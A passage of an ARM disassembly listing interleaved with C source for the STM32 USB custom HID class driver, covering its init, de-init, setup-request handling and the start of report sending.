 80088e8:	6878      	ldr	r0, [r7, #4]
 80088ea:	f004 fa5b 	bl	800cda4 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 80088ee:	4b15      	ldr	r3, [pc, #84]	; (8008944 <USBD_CUSTOM_HID_Init+0x154>)
 80088f0:	781b      	ldrb	r3, [r3, #0]
 80088f2:	f003 020f 	and.w	r2, r3, #15
 80088f6:	6879      	ldr	r1, [r7, #4]
 80088f8:	4613      	mov	r3, r2
 80088fa:	009b      	lsls	r3, r3, #2
 80088fc:	4413      	add	r3, r2
 80088fe:	009b      	lsls	r3, r3, #2
 8008900:	440b      	add	r3, r1
 8008902:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008906:	2201      	movs	r2, #1
 8008908:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 800890a:	68fb      	ldr	r3, [r7, #12]
 800890c:	2200      	movs	r2, #0
 800890e:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 8008912:	687b      	ldr	r3, [r7, #4]
 8008914:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008918:	687a      	ldr	r2, [r7, #4]
 800891a:	33b0      	adds	r3, #176	; 0xb0
 800891c:	009b      	lsls	r3, r3, #2
 800891e:	4413      	add	r3, r2
 8008920:	685b      	ldr	r3, [r3, #4]
 8008922:	685b      	ldr	r3, [r3, #4]
 8008924:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008926:	4b07      	ldr	r3, [pc, #28]	; (8008944 <USBD_CUSTOM_HID_Init+0x154>)
 8008928:	7819      	ldrb	r1, [r3, #0]
 800892a:	68fa      	ldr	r2, [r7, #12]
 800892c:	230f      	movs	r3, #15
 800892e:	6878      	ldr	r0, [r7, #4]
 8008930:	f004 fbea 	bl	800d108 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008934:	2300      	movs	r3, #0
}
 8008936:	4618      	mov	r0, r3
 8008938:	3710      	adds	r7, #16
 800893a:	46bd      	mov	sp, r7
 800893c:	bd80      	pop	{r7, pc}
 800893e:	bf00      	nop
 8008940:	200000a6 	.word	0x200000a6
 8008944:	200000a7 	.word	0x200000a7

08008948 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008948:	b580      	push	{r7, lr}
 800894a:	b082      	sub	sp, #8
 800894c:	af00      	add	r7, sp, #0
 800894e:	6078      	str	r0, [r7, #4]
 8008950:	460b      	mov	r3, r1
 8008952:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 8008954:	4b37      	ldr	r3, [pc, #220]	; (8008a34 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008956:	781b      	ldrb	r3, [r3, #0]
 8008958:	4619      	mov	r1, r3
 800895a:	6878      	ldr	r0, [r7, #4]
 800895c:	f004 fa60 	bl	800ce20 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 8008960:	4b34      	ldr	r3, [pc, #208]	; (8008a34 <USBD_CUSTOM_HID_DeInit+0xec>)
 8008962:	781b      	ldrb	r3, [r3, #0]
 8008964:	f003 020f 	and.w	r2, r3, #15
 8008968:	6879      	ldr	r1, [r7, #4]
 800896a:	4613      	mov	r3, r2
 800896c:	009b      	lsls	r3, r3, #2
 800896e:	4413      	add	r3, r2
 8008970:	009b      	lsls	r3, r3, #2
 8008972:	440b      	add	r3, r1
 8008974:	3324      	adds	r3, #36	; 0x24
 8008976:	2200      	movs	r2, #0
 8008978:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 800897a:	4b2e      	ldr	r3, [pc, #184]	; (8008a34 <USBD_CUSTOM_HID_DeInit+0xec>)
 800897c:	781b      	ldrb	r3, [r3, #0]
 800897e:	f003 020f 	and.w	r2, r3, #15
 8008982:	6879      	ldr	r1, [r7, #4]
 8008984:	4613      	mov	r3, r2
 8008986:	009b      	lsls	r3, r3, #2
 8008988:	4413      	add	r3, r2
 800898a:	009b      	lsls	r3, r3, #2
 800898c:	440b      	add	r3, r1
 800898e:	3326      	adds	r3, #38	; 0x26
 8008990:	2200      	movs	r2, #0
 8008992:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 8008994:	4b28      	ldr	r3, [pc, #160]	; (8008a38 <USBD_CUSTOM_HID_DeInit+0xf0>)
 8008996:	781b      	ldrb	r3, [r3, #0]
 8008998:	4619      	mov	r1, r3
 800899a:	6878      	ldr	r0, [r7, #4]
 800899c:	f004 fa40 	bl	800ce20 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 80089a0:	4b25      	ldr	r3, [pc, #148]	; (8008a38 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80089a2:	781b      	ldrb	r3, [r3, #0]
 80089a4:	f003 020f 	and.w	r2, r3, #15
 80089a8:	6879      	ldr	r1, [r7, #4]
 80089aa:	4613      	mov	r3, r2
 80089ac:	009b      	lsls	r3, r3, #2
 80089ae:	4413      	add	r3, r2
 80089b0:	009b      	lsls	r3, r3, #2
 80089b2:	440b      	add	r3, r1
 80089b4:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80089b8:	2200      	movs	r2, #0
 80089ba:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 80089bc:	4b1e      	ldr	r3, [pc, #120]	; (8008a38 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80089be:	781b      	ldrb	r3, [r3, #0]
 80089c0:	f003 020f 	and.w	r2, r3, #15
 80089c4:	6879      	ldr	r1, [r7, #4]
 80089c6:	4613      	mov	r3, r2
 80089c8:	009b      	lsls	r3, r3, #2
 80089ca:	4413      	add	r3, r2
 80089cc:	009b      	lsls	r3, r3, #2
 80089ce:	440b      	add	r3, r1
 80089d0:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80089d4:	2200      	movs	r2, #0
 80089d6:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 80089d8:	687b      	ldr	r3, [r7, #4]
 80089da:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089de:	687b      	ldr	r3, [r7, #4]
 80089e0:	32b0      	adds	r2, #176	; 0xb0
 80089e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089e6:	2b00      	cmp	r3, #0
 80089e8:	d01f      	beq.n	8008a2a <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 80089ea:	687b      	ldr	r3, [r7, #4]
 80089ec:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80089f0:	687a      	ldr	r2, [r7, #4]
 80089f2:	33b0      	adds	r3, #176	; 0xb0
 80089f4:	009b      	lsls	r3, r3, #2
 80089f6:	4413      	add	r3, r2
 80089f8:	685b      	ldr	r3, [r3, #4]
 80089fa:	689b      	ldr	r3, [r3, #8]
 80089fc:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 80089fe:	687b      	ldr	r3, [r7, #4]
 8008a00:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a04:	687b      	ldr	r3, [r7, #4]
 8008a06:	32b0      	adds	r2, #176	; 0xb0
 8008a08:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008a0c:	4618      	mov	r0, r3
 8008a0e:	f004 fc19 	bl	800d244 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008a12:	687b      	ldr	r3, [r7, #4]
 8008a14:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a18:	687b      	ldr	r3, [r7, #4]
 8008a1a:	32b0      	adds	r2, #176	; 0xb0
 8008a1c:	2100      	movs	r1, #0
 8008a1e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008a22:	687b      	ldr	r3, [r7, #4]
 8008a24:	2200      	movs	r2, #0
 8008a26:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008a2a:	2300      	movs	r3, #0
}
 8008a2c:	4618      	mov	r0, r3
 8008a2e:	3708      	adds	r7, #8
 8008a30:	46bd      	mov	sp, r7
 8008a32:	bd80      	pop	{r7, pc}
 8008a34:	200000a6 	.word	0x200000a6
 8008a38:	200000a7 	.word	0x200000a7

08008a3c <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 8008a3c:	b580      	push	{r7, lr}
 8008a3e:	b088      	sub	sp, #32
 8008a40:	af00      	add	r7, sp, #0
 8008a42:	6078      	str	r0, [r7, #4]
 8008a44:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008a46:	687b      	ldr	r3, [r7, #4]
 8008a48:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a4c:	687b      	ldr	r3, [r7, #4]
 8008a4e:	32b0      	adds	r2, #176	; 0xb0
 8008a50:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008a54:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 8008a56:	2300      	movs	r3, #0
 8008a58:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 8008a5a:	2300      	movs	r3, #0
 8008a5c:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 8008a5e:	2300      	movs	r3, #0
 8008a60:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 8008a62:	2300      	movs	r3, #0
 8008a64:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 8008a66:	693b      	ldr	r3, [r7, #16]
 8008a68:	2b00      	cmp	r3, #0
 8008a6a:	d101      	bne.n	8008a70 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 8008a6c:	2303      	movs	r3, #3
 8008a6e:	e0f8      	b.n	8008c62 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008a70:	683b      	ldr	r3, [r7, #0]
 8008a72:	781b      	ldrb	r3, [r3, #0]
 8008a74:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008a78:	2b00      	cmp	r3, #0
 8008a7a:	d056      	beq.n	8008b2a <USBD_CUSTOM_HID_Setup+0xee>
 8008a7c:	2b20      	cmp	r3, #32
 8008a7e:	f040 80e8 	bne.w	8008c52 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008a82:	683b      	ldr	r3, [r7, #0]
 8008a84:	785b      	ldrb	r3, [r3, #1]
 8008a86:	3b02      	subs	r3, #2
 8008a88:	2b09      	cmp	r3, #9
 8008a8a:	d846      	bhi.n	8008b1a <USBD_CUSTOM_HID_Setup+0xde>
 8008a8c:	a201      	add	r2, pc, #4	; (adr r2, 8008a94 <USBD_CUSTOM_HID_Setup+0x58>)
 8008a8e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008a92:	bf00      	nop
 8008a94:	08008aed 	.word	0x08008aed
 8008a98:	08008acb 	.word	0x08008acb
 8008a9c:	08008b1b 	.word	0x08008b1b
 8008aa0:	08008b1b 	.word	0x08008b1b
 8008aa4:	08008b1b 	.word	0x08008b1b
 8008aa8:	08008b1b 	.word	0x08008b1b
 8008aac:	08008b1b 	.word	0x08008b1b
 8008ab0:	08008afd 	.word	0x08008afd
 8008ab4:	08008adb 	.word	0x08008adb
 8008ab8:	08008abd 	.word	0x08008abd
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008abc:	683b      	ldr	r3, [r7, #0]
 8008abe:	885b      	ldrh	r3, [r3, #2]
 8008ac0:	b2db      	uxtb	r3, r3
 8008ac2:	461a      	mov	r2, r3
 8008ac4:	693b      	ldr	r3, [r7, #16]
 8008ac6:	611a      	str	r2, [r3, #16]
          break;
 8008ac8:	e02e      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 8008aca:	693b      	ldr	r3, [r7, #16]
 8008acc:	3310      	adds	r3, #16
 8008ace:	2201      	movs	r2, #1
 8008ad0:	4619      	mov	r1, r3
 8008ad2:	6878      	ldr	r0, [r7, #4]
 8008ad4:	f003 fd0e 	bl	800c4f4 <USBD_CtlSendData>
          break;
 8008ad8:	e026      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 8008ada:	683b      	ldr	r3, [r7, #0]
 8008adc:	885b      	ldrh	r3, [r3, #2]
 8008ade:	0a1b      	lsrs	r3, r3, #8
 8008ae0:	b29b      	uxth	r3, r3
 8008ae2:	b2db      	uxtb	r3, r3
 8008ae4:	461a      	mov	r2, r3
 8008ae6:	693b      	ldr	r3, [r7, #16]
 8008ae8:	615a      	str	r2, [r3, #20]
          break;
 8008aea:	e01d      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008aec:	693b      	ldr	r3, [r7, #16]
 8008aee:	3314      	adds	r3, #20
 8008af0:	2201      	movs	r2, #1
 8008af2:	4619      	mov	r1, r3
 8008af4:	6878      	ldr	r0, [r7, #4]
 8008af6:	f003 fcfd 	bl	800c4f4 <USBD_CtlSendData>
          break;
 8008afa:	e015      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008afc:	693b      	ldr	r3, [r7, #16]
 8008afe:	2201      	movs	r2, #1
 8008b00:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008b02:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008b04:	683b      	ldr	r3, [r7, #0]
 8008b06:	88db      	ldrh	r3, [r3, #6]
 8008b08:	2b0f      	cmp	r3, #15
 8008b0a:	bf28      	it	cs
 8008b0c:	230f      	movcs	r3, #15
 8008b0e:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008b10:	461a      	mov	r2, r3
 8008b12:	6878      	ldr	r0, [r7, #4]
 8008b14:	f003 fd1a 	bl	800c54c <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008b18:	e006      	b.n	8008b28 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 8008b1a:	6839      	ldr	r1, [r7, #0]
 8008b1c:	6878      	ldr	r0, [r7, #4]
 8008b1e:	f003 fc78 	bl	800c412 <USBD_CtlError>
          ret = USBD_FAIL;
 8008b22:	2303      	movs	r3, #3
 8008b24:	75fb      	strb	r3, [r7, #23]
          break;
 8008b26:	bf00      	nop
      }
      break;
 8008b28:	e09a      	b.n	8008c60 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008b2a:	683b      	ldr	r3, [r7, #0]
 8008b2c:	785b      	ldrb	r3, [r3, #1]
 8008b2e:	2b0b      	cmp	r3, #11
 8008b30:	f200 8086 	bhi.w	8008c40 <USBD_CUSTOM_HID_Setup+0x204>
 8008b34:	a201      	add	r2, pc, #4	; (adr r2, 8008b3c <USBD_CUSTOM_HID_Setup+0x100>)
 8008b36:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008b3a:	bf00      	nop
 8008b3c:	08008b6d 	.word	0x08008b6d
 8008b40:	08008c4f 	.word	0x08008c4f
 8008b44:	08008c41 	.word	0x08008c41
 8008b48:	08008c41 	.word	0x08008c41
 8008b4c:	08008c41 	.word	0x08008c41
 8008b50:	08008c41 	.word	0x08008c41
 8008b54:	08008b97 	.word	0x08008b97
 8008b58:	08008c41 	.word	0x08008c41
 8008b5c:	08008c41 	.word	0x08008c41
 8008b60:	08008c41 	.word	0x08008c41
 8008b64:	08008bef 	.word	0x08008bef
 8008b68:	08008c19 	.word	0x08008c19
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b6c:	687b      	ldr	r3, [r7, #4]
 8008b6e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b72:	b2db      	uxtb	r3, r3
 8008b74:	2b03      	cmp	r3, #3
 8008b76:	d107      	bne.n	8008b88 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008b78:	f107 030e 	add.w	r3, r7, #14
 8008b7c:	2202      	movs	r2, #2
 8008b7e:	4619      	mov	r1, r3
 8008b80:	6878      	ldr	r0, [r7, #4]
 8008b82:	f003 fcb7 	bl	800c4f4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b86:	e063      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b88:	6839      	ldr	r1, [r7, #0]
 8008b8a:	6878      	ldr	r0, [r7, #4]
 8008b8c:	f003 fc41 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 8008b90:	2303      	movs	r3, #3
 8008b92:	75fb      	strb	r3, [r7, #23]
          break;
 8008b94:	e05c      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008b96:	683b      	ldr	r3, [r7, #0]
 8008b98:	885b      	ldrh	r3, [r3, #2]
 8008b9a:	0a1b      	lsrs	r3, r3, #8
 8008b9c:	b29b      	uxth	r3, r3
 8008b9e:	2b22      	cmp	r3, #34	; 0x22
 8008ba0:	d110      	bne.n	8008bc4 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008ba2:	683b      	ldr	r3, [r7, #0]
 8008ba4:	88db      	ldrh	r3, [r3, #6]
 8008ba6:	2b49      	cmp	r3, #73	; 0x49
 8008ba8:	bf28      	it	cs
 8008baa:	2349      	movcs	r3, #73	; 0x49
 8008bac:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 8008bae:	687b      	ldr	r3, [r7, #4]
 8008bb0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008bb4:	687a      	ldr	r2, [r7, #4]
 8008bb6:	33b0      	adds	r3, #176	; 0xb0
 8008bb8:	009b      	lsls	r3, r3, #2
 8008bba:	4413      	add	r3, r2
 8008bbc:	685b      	ldr	r3, [r3, #4]
 8008bbe:	681b      	ldr	r3, [r3, #0]
 8008bc0:	61bb      	str	r3, [r7, #24]
 8008bc2:	e00d      	b.n	8008be0 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008bc4:	683b      	ldr	r3, [r7, #0]
 8008bc6:	885b      	ldrh	r3, [r3, #2]
 8008bc8:	0a1b      	lsrs	r3, r3, #8
 8008bca:	b29b      	uxth	r3, r3
 8008bcc:	2b21      	cmp	r3, #33	; 0x21
 8008bce:	d107      	bne.n	8008be0 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008bd0:	4b26      	ldr	r3, [pc, #152]	; (8008c6c <USBD_CUSTOM_HID_Setup+0x230>)
 8008bd2:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008bd4:	683b      	ldr	r3, [r7, #0]
 8008bd6:	88db      	ldrh	r3, [r3, #6]
 8008bd8:	2b09      	cmp	r3, #9
 8008bda:	bf28      	it	cs
 8008bdc:	2309      	movcs	r3, #9
 8008bde:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008be0:	8bfb      	ldrh	r3, [r7, #30]
 8008be2:	461a      	mov	r2, r3
 8008be4:	69b9      	ldr	r1, [r7, #24]
 8008be6:	6878      	ldr	r0, [r7, #4]
 8008be8:	f003 fc84 	bl	800c4f4 <USBD_CtlSendData>
          break;
 8008bec:	e030      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008bee:	687b      	ldr	r3, [r7, #4]
 8008bf0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008bf4:	b2db      	uxtb	r3, r3
 8008bf6:	2b03      	cmp	r3, #3
 8008bf8:	d107      	bne.n	8008c0a <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 8008bfa:	693b      	ldr	r3, [r7, #16]
 8008bfc:	3318      	adds	r3, #24
 8008bfe:	2201      	movs	r2, #1
 8008c00:	4619      	mov	r1, r3
 8008c02:	6878      	ldr	r0, [r7, #4]
 8008c04:	f003 fc76 	bl	800c4f4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008c08:	e022      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008c0a:	6839      	ldr	r1, [r7, #0]
 8008c0c:	6878      	ldr	r0, [r7, #4]
 8008c0e:	f003 fc00 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 8008c12:	2303      	movs	r3, #3
 8008c14:	75fb      	strb	r3, [r7, #23]
          break;
 8008c16:	e01b      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008c18:	687b      	ldr	r3, [r7, #4]
 8008c1a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008c1e:	b2db      	uxtb	r3, r3
 8008c20:	2b03      	cmp	r3, #3
 8008c22:	d106      	bne.n	8008c32 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008c24:	683b      	ldr	r3, [r7, #0]
 8008c26:	885b      	ldrh	r3, [r3, #2]
 8008c28:	b2db      	uxtb	r3, r3
 8008c2a:	461a      	mov	r2, r3
 8008c2c:	693b      	ldr	r3, [r7, #16]
 8008c2e:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008c30:	e00e      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008c32:	6839      	ldr	r1, [r7, #0]
 8008c34:	6878      	ldr	r0, [r7, #4]
 8008c36:	f003 fbec 	bl	800c412 <USBD_CtlError>
            ret = USBD_FAIL;
 8008c3a:	2303      	movs	r3, #3
 8008c3c:	75fb      	strb	r3, [r7, #23]
          break;
 8008c3e:	e007      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008c40:	6839      	ldr	r1, [r7, #0]
 8008c42:	6878      	ldr	r0, [r7, #4]
 8008c44:	f003 fbe5 	bl	800c412 <USBD_CtlError>
          ret = USBD_FAIL;
 8008c48:	2303      	movs	r3, #3
 8008c4a:	75fb      	strb	r3, [r7, #23]
          break;
 8008c4c:	e000      	b.n	8008c50 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008c4e:	bf00      	nop
      }
      break;
 8008c50:	e006      	b.n	8008c60 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008c52:	6839      	ldr	r1, [r7, #0]
 8008c54:	6878      	ldr	r0, [r7, #4]
 8008c56:	f003 fbdc 	bl	800c412 <USBD_CtlError>
      ret = USBD_FAIL;
 8008c5a:	2303      	movs	r3, #3
 8008c5c:	75fb      	strb	r3, [r7, #23]
      break;
 8008c5e:	bf00      	nop
  }
  return (uint8_t)ret;
 8008c60:	7dfb      	ldrb	r3, [r7, #23]
}
 8008c62:	4618      	mov	r0, r3
 8008c64:	3720      	adds	r7, #32
 8008c66:	46bd      	mov	sp, r7
 8008c68:	bd80      	pop	{r7, pc}
 8008c6a:	bf00      	nop
 8008c6c:	20000090 	.word	0x20000090

08008c70 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008c70:	b580      	push	{r7, lr}
 8008c72:	b086      	sub	sp, #24
 8008c74:	af00      	add	r7, sp, #0
 8008c76:	60f8      	str	r0, [r7, #12]
 8008c78:	60b9      	str	r1, [r7, #8]
 8008c7a:	4613      	mov	r3, r2
 8008c7c:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c7e:	68fb      	ldr	r3, [r7, #12]
 8008c80:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c84:	68fb      	ldr	r3, [r7, #12]
 8008c86:	32b0      	adds	r2, #176	; 0xb0
 8008c88:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c8c:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008c8e:	697b      	ldr	r3, [r7, #20]
 8008c90:	2b00      	cmp	r3, #0
 8008c92:	d101      	bne.n	8008c98 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008c94:	2303      	movs	r3, #3
 8008c96:	e019      	b.n	8008ccc <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008c98:	68fb      	ldr	r3, [r7, #12]
 8008c9a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008c9e:	b2db      	uxtb	r3, r3
 8008ca0:	2b03      	cmp	r3, #3
 8008ca2:	d112      	bne.n	8008cca <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008ca4:	697b      	ldr	r3, [r7, #20]
 8008ca6:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008caa:	2b00      	cmp	r3, #0
